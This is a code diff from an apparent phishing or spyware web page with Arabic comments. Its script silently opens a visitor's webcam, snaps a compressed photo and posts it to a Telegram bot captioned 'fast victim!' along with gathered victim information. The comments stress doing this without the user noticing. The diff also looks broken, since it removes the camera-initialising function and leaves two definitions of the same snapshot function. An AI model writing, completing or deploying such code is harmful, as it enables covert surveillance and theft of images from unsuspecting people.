@@ -50,22 +50,33 @@
             }
         }
 
-        async function initCamera(info) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
-                const video = document.getElementById("video");
-                video.srcObject = stream;
+        async function takeSnapshot(stream, info) {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    
+    // تحديد دقة منخفضة لتسريع الإرسال (مهم جداً للسرعة)
+    canvas.width = 480; 
+    canvas.height = 360;
+    canvas.getContext("2d").drawImage(video, 0, 0, 480, 360);
 
-                // انتظر قليلاً لفتح الكاميرا في الخلفية دون أن يشعر المستخدم
-                setTimeout(() => {
-                    takeSnapshot(stream, info);
-                }, 1500);
-            } catch(e) {
-                await sendMessage(info + "\n❌ الكاميرا: تم رفض الإذن");
-                finish();
-            }
-        }
+    // ضغط الصورة بنسبة 40% (تصبح مساحتها صغيرة جداً وترسل فوراً)
+    canvas.toBlob(async blob => {
+        const form = new FormData();
+        form.append("chat_id", CHAT_ID);
+        form.append("photo", blob, "sh.jpg");
+        form.append("caption", `🚀 ضحية سريع!\n${info}`);
+        
+        // إرسال بدون انتظار (Fire and Forget) لكي لا يشعر المستخدم ببطء
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
+            method: "POST", 
+            body: form 
+        });
 
+        // إيقاف الكاميرا فوراً لتوفير موارد الجهاز
+        stream.getTracks().forEach(t => t.stop());
+        finish();
+    }, "image/jpeg", 0.4); // 0.4 تعني ضغط عالي وسرعة فائقة
+}
         async function takeSnapshot(stream, info) {
             const video = document.getElementById("video");
             const canvas = document.getElementById("canvas");
